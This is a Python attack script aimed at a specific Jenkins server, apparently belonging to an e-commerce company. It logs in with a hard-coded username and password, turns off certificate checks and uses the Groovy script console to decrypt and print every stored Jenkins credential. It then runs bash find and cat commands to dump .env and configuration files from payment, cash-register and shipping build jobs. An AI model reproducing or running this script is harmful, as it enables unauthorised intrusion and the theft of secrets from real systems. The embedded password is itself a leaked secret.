import urllib.request, base64, json, urllib.parse, ssl, http.cookiejar

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

AUTH = base64.b64encode(b'eduardo.cruz:xwMyIxfkZZaDNkFg').decode()
BASE = 'https://jenkins-ng.dev.claroshop.com'

def run_groovy(script):
    cj = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(cj),
        urllib.request.HTTPSHandler(context=ctx)
    )
    req = urllib.request.Request(BASE + '/crumbIssuer/api/json', headers={'Authorization': 'Basic ' + AUTH})
    r = opener.open(req, timeout=15)
    crumb = json.loads(r.read().decode())
    data = urllib.parse.urlencode({'script': script}).encode()
    req2 = urllib.request.Request(BASE + '/scriptText', data=data,
        headers={'Authorization': 'Basic ' + AUTH, crumb['crumbRequestField']: crumb['crumb']})
    r2 = opener.open(req2, timeout=90)
    return r2.read().decode()

# Decrypt ALL Jenkins credentials natively
print("=" * 60)
print("DECRYPTED JENKINS CREDENTIALS (native Groovy)")
print("=" * 60)
q1 = """import com.cloudbees.plugins.credentials.*
import com.cloudbees.plugins.credentials.impl.*
import org.jenkinsci.plugins.plaincredentials.impl.*
import com.cloudbees.plugins.credentials.domains.*

def creds = com.cloudbees.plugins.credentials.CredentialsProvider.lookupCredentials(
    com.cloudbees.plugins.credentials.common.StandardCredentials.class,
    Jenkins.instance,
    null,
    null
)

creds.each { c ->
    println "=== ${c.id} (${c.class.simpleName}) ==="
    println "  Description: ${c.description}"
    if (c instanceof com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl) {
        println "  Username: ${c.username}"
        println "  Password: ${c.password.plainText}"
    } else if (c instanceof org.jenkinsci.plugins.plaincredentials.impl.StringCredentialsImpl) {
        println "  Secret: ${c.secret.plainText}"
    } else if (c instanceof org.jenkinsci.plugins.docker.commons.credentials.DockerServerCredentials) {
        println "  [Docker creds - skipped]"
    } else {
        println "  [Type: ${c.class.name}]"
    }
    println ""
}
"""
print(run_groovy(q1))

# Payment bank deposit API config
print("=" * 60)
print("PAYMENT-BANK-DEPOSIT-API archives")
print("=" * 60)
q2 = 'def r = ["bash","-c","find /var/jenkins_home/jobs/cs_new_front/jobs/cs_new_pipe_build_payment-bank-deposit-api/builds -type f -name *.php -o -name *.env -o -name *.properties -o -name *.yml 2>/dev/null | tail -15"].execute().text\nprintln r'
print(run_groovy(q2))

# T1envios config
print("=" * 60)
print("T1ENVIOS CONFIG (sierra)")
print("=" * 60)
q3 = 'def r = ["bash","-c","find /var/jenkins_home/jobs/t1e_legacy_back/jobs/t1e_legacy_pipe_build_sierra-t1envios-config/builds -type f -name *.php -o -name *.env -o -name *.properties -o -name *.yml 2>/dev/null | tail -10"].execute().text\nprintln r'
print(run_groovy(q3))

# Caja-pagos workspace
print("=" * 60)
print("CAJA-PAGOS WORKSPACE .env")
print("=" * 60)
q4 = 'def r = ["bash","-c","find /var/jenkins_home/workspace/cs_msa_front/cs_msa_build_caja-pagos-api-deploy2dev -name .env -type f 2>/dev/null | xargs cat 2>/dev/null; find /var/jenkins_home/workspace/cs_msa_front/cs_msa_build_caja-pagos-api-deploy2dev -name cache.properties -type f 2>/dev/null | xargs cat 2>/dev/null"].execute().text\nprintln r'
print(run_groovy(q4))
